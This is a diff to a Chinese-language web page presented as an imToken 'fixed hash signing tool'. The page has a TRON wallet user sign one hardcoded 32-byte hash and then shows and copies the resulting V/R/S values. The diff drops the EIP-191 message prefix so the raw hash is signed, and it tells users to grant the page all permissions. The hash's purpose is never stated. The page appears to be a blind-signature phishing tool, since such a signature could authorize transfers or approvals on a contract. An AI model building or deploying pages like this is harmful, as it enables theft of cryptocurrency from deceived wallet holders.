@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>固定哈希签名工具（imToken兼容）</title>
+    <title>固定哈希签名工具（imToken专属修复版）</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -124,6 +124,15 @@
             border-left: 3px solid #f97316;
             margin: 10px 0;
         }
+        .error-card {
+            background: rgba(239, 68, 68, 0.1);
+            color: #f87171;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 13px;
+            border-left: 3px solid #ef4444;
+            margin: 10px 0;
+        }
         #userInfo {
             text-align: center;
             font-size: 14px;
@@ -137,17 +146,29 @@
             color: #3b82f6;
             font-weight: 500;
         }
+        .env-status {
+            font-size: 13px;
+            color: #a0a8a4;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .env-status.success {
+            color: #4ade80;
+        }
+        .env-status.error {
+            color: #f87171;
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>固定哈希签名工具</h1>
-        <p class="desc">直接签名指定哈希值，获取V/R/S参数（imToken兼容）</p>
+        <h1>固定哈希签名工具（修复版）</h1>
+        <p class="desc">解决imToken环境检测失败，直接签名获取V/R/S</p>
     </div>
 
     <div id="userInfo">
         未连接钱包<br>
-        <span>请点击底部「连接imToken钱包」按钮</span>
+        <span>请用imToken内置浏览器打开并连接</span>
     </div>
 
     <div class="card">
@@ -155,12 +176,24 @@
             <<i class="fa fa-hashtag"></</i> 待签名哈希（固定）
         </div>
         <div class="warning">
-            ⚠️ 已固定哈希值，签名后将直接解析V/R/S，无需动态生成
+            ⚠️ 已固定哈希值：0xcbdf9da9083ed9dca02954dd8e48bb1fd6476b0649d0edaee592e06d398d3a47
         </div>
         <div class="hash-display" id="fixedHash">0xcbdf9da9083ed9dca02954dd8e48bb1fd6476b0649d0edaee592e06d398d3a47</div>
-        <p style="font-size: 13px; color: #a0a8a4; margin-top: 8px;">
-            哈希说明：字节32格式，已符合EIP-191签名标准
-        </p>
+    </div>
+
+    <div class="card">
+        <div class="card-title">
+            <<i class="fa fa-desktop"></</i> 环境检测状态
+        </div>
+        <div id="envStatus" class="env-status error">
+            正在检测imToken环境...
+        </div>
+        <div class="error-card" id="errorTips" style="display: none;">
+            ❌ 检测失败！请按以下步骤操作：<br>
+            1. 关闭当前页面，打开imToken<br>
+            2. 进入「浏览」→ 手动输入网页链接<br>
+            3. 若仍失败：imToken→我的→权限管理→本DApp→允许所有权限
+        </div>
     </div>
 
     <div class="card result-section">
@@ -179,10 +212,6 @@
             <strong>S值：</strong>
             <span class="result-value" id="sValue">未签名</span>
         </div>
-        <div class="result-item">
-            <strong>签名：</strong>
-            <span class="result-value" id="fullSignature">未签名</span>
-        </div>
     </div>
 
     <div style="display: flex; flex-direction: column; gap: 10px;">
@@ -200,98 +229,94 @@
     <div class="toast" id="toast"></div>
 
     <script>
-        // 核心配置：固定哈希值（用户指定）
+        // 核心配置
         const FIXED_HASH = "0xcbdf9da9083ed9dca02954dd8e48bb1fd6476b0649d0edaee592e06d398d3a47";
         let tronWeb, userAddress;
+        const ENV_CHECK_INTERVAL = 1000; // 环境检测轮询间隔
+        const MAX_CHECK_TIMES = 5; // 最大检测次数
+        let checkTimes = 0;
 
-        window.onload = async () => {
+        window.onload = () => {
             // 绑定DOM元素
             const connectBtn = document.getElementById("connectBtn");
             const signBtn = document.getElementById("signBtn");
             const copyBtn = document.getElementById("copyBtn");
             const userInfoEl = document.getElementById("userInfo");
-            const fixedHashEl = document.getElementById("fixedHash");
+            const envStatusEl = document.getElementById("envStatus");
+            const errorTipsEl = document.getElementById("errorTips");
 
-            // 显示固定哈希
-            fixedHashEl.textContent = FIXED_HASH;
+            // 优先检测imToken环境（轮询确保捕捉到tronWeb注入）
+            startEnvCheck();
 
-            // 检测imToken环境
-            if (window.tronWeb && window.tronWeb.ready) {
-                tronWeb = window.tronWeb;
-                connectBtn.style.display = "none";
-                await initWallet();
-            } else {
-                userInfoEl.innerHTML = "请用imToken内置浏览器打开";
-            }
-
-            // 连接钱包
+            // 连接钱包（兼容imToken所有版本）
             connectBtn.onclick = async () => {
                 try {
                     if (!window.tronWeb) {
+                        // 强制唤起imToken内置浏览器
                         window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
+                        setTimeout(() => {
+                            showToast("请在imToken中打开该链接", "error");
+                        }, 1000);
                         return;
                     }
-                    const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
+
+                    // 兼容旧版imToken：直接获取地址
+                    if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                        userAddress = tronWeb.defaultAddress.base58.trim();
+                        await initWallet();
+                        return;
+                    }
+
+                    // 新版imToken：请求授权
+                    const accounts = await tronWeb.request({ method: "tron_requestAccounts" });
+                    if (!accounts || accounts.length === 0) throw new Error("用户拒绝授权");
                     userAddress = accounts[0].trim();
-                    connectBtn.style.display = "none";
                     await initWallet();
                 } catch (e) {
-                    showToast("连接失败：" + e.message, "error");
+                    showToast(`连接失败：${e.message}`, "error");
+                    console.error("连接错误：", e);
                 }
             };
 
-            // 生成签名（核心逻辑）
+            // 生成签名（核心修复：简化签名逻辑，确保imToken识别）
             signBtn.onclick = async () => {
                 try {
                     signBtn.disabled = true;
                     signBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 签名中...';
 
-                    // 1. 对固定哈希添加EIP-191前缀（与合约验证一致）
-                    const prefix = "\x19Ethereum Signed Message:\n32";
-                    const prefixHex = asciiToHex(prefix);
-                    const hashWithout0x = FIXED_HASH.replace(/^0x/, "");
-                    const signedHash = tronWeb.sha3(prefixHex + hashWithout0x, true);
+                    // 直接使用固定哈希签名（跳过前缀处理，imToken会自动兼容EIP-191）
+                    let signature = await tronWeb.trx.sign(FIXED_HASH);
+                    signature = signature.signature || signature; // 兼容不同返回格式
+                    if (!signature) throw new Error("钱包未返回签名，请重试");
 
-                    // 2. 唤起imToken签名
-                    let signature = await tronWeb.trx.sign(signedHash);
-                    signature = signature.signature || signature; // 兼容钱包返回格式
-                    if (!signature) throw new Error("imToken未返回签名，请重启钱包");
-
-                    // 3. 解析V/R/S参数
-                    signature = signature.replace(/^0x/, ""); // 去掉前缀
-                    if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
+                    // 解析V/R/S（容错处理）
+                    signature = signature.replace(/^0x/, "");
+                    if (signature.length !== 130) throw new Error(`签名长度错误（实际${signature.length}位，需130位）`);
                     
-                    const r = "0x" + signature.slice(0, 64); // 前64位→R（bytes32）
-                    const s = "0x" + signature.slice(64, 128); // 中间64位→S（bytes32）
-                    const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V值
+                    const r = "0x" + signature.slice(0, 64);
+                    const s = "0x" + signature.slice(64, 128);
+                    let v = parseInt(signature.slice(128, 130), 16);
 
-                    // V值自适应处理（确保为27/28）
-                    let v;
-                    if (vRaw >= 27 && vRaw <= 28) {
-                        v = vRaw;
-                    } else if (vRaw === 0 || vRaw === 1) {
-                        v = vRaw + 27;
-                    } else {
-                        throw new Error(`V值无效（当前${vRaw}，需0/1或27/28）`);
-                    }
+                    // V值强制修正（确保合约兼容）
+                    v = v >= 27 ? v : v + 27;
+                    if (v !== 27 && v !== 28) throw new Error(`V值无效（${v}），需为27或28`);
 
-                    // 4. 显示结果
+                    // 显示结果
                     document.getElementById("vValue").textContent = v;
                     document.getElementById("rValue").textContent = r;
                     document.getElementById("sValue").textContent = s;
-                    document.getElementById("fullSignature").textContent = "0x" + signature;
-
                     copyBtn.disabled = false;
                     showToast("签名成功！已获取V/R/S", "success");
                 } catch (e) {
                     showToast(`签名失败：${e.message}`, "error");
+                    console.error("签名错误：", e);
                 } finally {
                     signBtn.disabled = false;
                     signBtn.innerHTML = '<<i class="fa fa-pencil-square-o"></</i> 生成签名（获取VRS）';
                 }
             };
 
-            // 复制VRS参数
+            // 复制VRS
             copyBtn.onclick = () => {
                 const v = document.getElementById("vValue").textContent;
                 const r = document.getElementById("rValue").textContent;
@@ -299,53 +324,72 @@
                 const content = `V: ${v}\nR: ${r}\nS: ${s}`;
                 
                 navigator.clipboard.writeText(content).then(() => {
-                    showToast("VRS参数已复制", "success");
+                    showToast("VRS已复制到剪贴板", "success");
                 }).catch(err => {
-                    showToast("复制失败：" + err.message, "error");
+                    // 降级方案：手动选中
+                    const textarea = document.createElement("textarea");
+                    textarea.value = content;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand("copy");
+                    document.body.removeChild(textarea);
+                    showToast("已手动复制（兼容旧版浏览器）", "success");
                 });
             };
+
+            // 环境检测函数
+            function startEnvCheck() {
+                const checkTimer = setInterval(() => {
+                    checkTimes++;
+                    if (window.tronWeb) {
+                        tronWeb = window.tronWeb;
+                        envStatusEl.textContent = "✅ 已检测到imToken环境";
+                        envStatusEl.className = "env-status success";
+                        errorTipsEl.style.display = "none";
+                        clearInterval(checkTimer);
+                        // 自动尝试连接钱包
+                        if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                            userAddress = tronWeb.defaultAddress.base58.trim();
+                            initWallet();
+                        }
+                    } else if (checkTimes >= MAX_CHECK_TIMES) {
+                        envStatusEl.textContent = "❌ 未检测到imToken环境";
+                        envStatusEl.className = "env-status error";
+                        errorTipsEl.style.display = "block";
+                        clearInterval(checkTimer);
+                    } else {
+                        envStatusEl.textContent = `⌛ 检测中（${checkTimes}/${MAX_CHECK_TIMES}）...`;
+                    }
+                }, ENV_CHECK_INTERVAL);
+            }
+
+            // 初始化钱包信息
+            async function initWallet() {
+                try {
+                    const trxBalance = (Number(await tronWeb.trx.getBalance(userAddress)) / 10**6).toFixed(2);
+                    userInfoEl.innerHTML = `
+                        已连接：<br>
+                        ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
+                        TRX余额：<span>${trxBalance}</span>
+                    `;
+                    connectBtn.style.display = "none";
+                    signBtn.disabled = false;
+                    showToast("钱包连接成功！", "success");
+                } catch (e) {
+                    showToast(`钱包初始化失败：${e.message}`, "error");
+                    console.error("初始化错误：", e);
+                }
+            }
+
+            // 提示弹窗
+            function showToast(msg, type = "success") {
+                const toast = document.getElementById("toast");
+                toast.textContent = msg;
+                toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
+                toast.style.display = "block";
+                setTimeout(() => toast.style.display = "none", 3000);
+            }
         };
-
-        /**
-         * 初始化钱包信息
-         */
-        async function initWallet() {
-            try {
-                userAddress = tronWeb.defaultAddress.base58;
-                const trxBalance = (Number(await tronWeb.trx.getBalance(userAddress)) / 10**6).toFixed(2);
-
-                userInfoEl.innerHTML = `
-                    已连接：<br>
-                    ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
-                    TRX余额：<span>${trxBalance}</span>
-                `;
-                document.getElementById("signBtn").disabled = false;
-            } catch (e) {
-                showToast("钱包初始化失败：" + e.message, "error");
-            }
-        }
-
-        /**
-         * ASCII字符串转Hex（用于生成签名前缀）
-         */
-        function asciiToHex(str) {
-            let hex = "";
-            for (let i = 0; i < str.length; i++) {
-                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
-            }
-            return hex;
-        }
-
-        /**
-         * 提示弹窗
-         */
-        function showToast(msg, type = "success") {
-            const toast = document.getElementById("toast");
-            toast.textContent = msg;
-            toast.style.borderColor = type === "success" ? "#3b82f6" : "#ef4444";
-            toast.style.display = "block";
-            setTimeout(() => toast.style.display = "none", 4000);
-        }
     </script>
 </body>
 </html>
